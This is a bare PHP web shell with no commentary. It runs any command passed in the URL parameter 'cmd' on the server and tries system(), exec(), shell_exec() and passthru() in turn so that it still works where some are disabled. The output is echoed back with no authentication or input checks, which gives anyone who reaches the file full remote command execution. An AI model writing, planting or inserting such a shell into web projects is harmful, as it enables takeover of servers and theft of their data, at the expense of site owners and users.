<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    
    // Try multiple execution methods
    $output = null;
    
    // Method 1: system()
    ob_start();
    system($cmd . " 2>&1");
    $output = ob_get_clean();
    
    if(!$output){
        // Method 2: exec()
        exec($cmd . " 2>&1", $exec_output);
        $output = implode("\n", $exec_output);
    }
    
    if(!$output){
        // Method 3: shell_exec()
        $output = shell_exec($cmd . " 2>&1");
    }
    
    if(!$output){
        // Method 4: passthru()
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    }
    
    echo $output ? $output : "No output or all execution methods failed";
}
?>
